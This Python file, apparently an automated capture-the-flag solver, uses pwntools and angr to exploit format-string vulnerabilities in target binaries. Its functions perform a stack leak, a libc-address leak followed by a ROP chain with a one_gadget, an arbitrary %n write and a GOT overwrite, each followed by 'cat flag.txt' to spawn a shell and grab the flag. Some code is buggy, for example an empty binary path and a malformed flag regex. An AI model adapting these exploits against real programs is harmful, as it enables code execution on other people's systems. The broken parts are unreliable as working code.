from typing import Optional
import re
from pwn import *
import angr


def stack_leak(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    POINTER_RE = r"""0x([0-9a-fA-F]+)"""

    found_flag = False
    flag = ""
    for i in range(1000):
        p = process(bin_path)
        p.sendline(start_pay + f"%{i}$p".encode("utf-8"))
        try:
            out = p.recvS()
        except EOFError:
            break
        comp = re.compile(POINTER_RE)
        srch = comp.search(out)
        if srch:
            try:
                text = bytes.fromhex(srch.group(1)).decode("ascii")[::-1]
            except (UnicodeDecodeError, ValueError):
                continue
            if "flag" in text:
                found_flag = True
            if found_flag:
                flag += text
            if "}" in text:
                break
    
    if found_flag:
        print(f"Flag found! {flag}")
    else:
        print("Could not find flag from leaking stack!")


def libc_leak(vuln) -> Optional[str]:
    bin_path = ""
    start_pay = vuln.payload_start
    POINTER_RE = r"""0x([0-9A-F]+)"""
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]^{32}\})"""

    for i in range(1000):
        p = process(bin_path)
        p.send(start_pay + f"%{i}$p")
        try:
            out = p.recvS()
        except EOFError:
            break
        p.kill()
        comp = re.compile(POINTER_RE)
        srch = comp.search(out)
        if srch:
            address = int(srch.group(1), 16)
            leak_offset = 0x7ffff7e13d0a-0x7ffff7ded000
            libc_leak = address - leak_offset

            pop_r12 = 0x26e9a+libc_leak
            one_gadget = 0xcbd1a+libc_leak

            p = process(bin_path)
            p.send(start_pay + p64(pop_r12) + p64(0) + p64(one_gadget))
            p.send("cat flag.txt")
            try:
                ans = p.recvS()
            except EOFError:
                break
            p.kill()

            comp = re.compile(FLAG_RE)
            srch = comp.search(ans)
            if srch:
                return srch.group(1)
    print("Failed to find flag from libc leak")

def write_prim(vuln) -> Optional[str]:
    e = ELF(vuln.bin_path)
    format_write = vuln.payload_start + b'%1337d%8$n      '+p64(e.sym['pwnme'])
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    p = process(vuln.bin_path)
    p.sendline(format_write)
    p.recv()
    p.sendline(b'cat flag.txt')

    try:
        out = p.recvS()
    except EOFError:
        return None
    
    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)

def got_overwrite(vuln) -> Optional[str]:
    e = ELF(vuln.bin_path)
    project = angr.Project(vuln.bin_path)
    p = process(vuln.bin_path)
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    win_print = project.loader.find_symbol('win').rebased_addr
    final_win = str(win_print).encode()
    test = b'%' + final_win + b'd%8$n   '
    format_write = test+p64(e.got['putchar'])
    p.sendline(format_write)
    p.sendline(b'cat flag.txt')
    
    out = ""
    while "flag" not in out:
        try:
            out += p.recvS()
        except EOFError:
            return None
    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)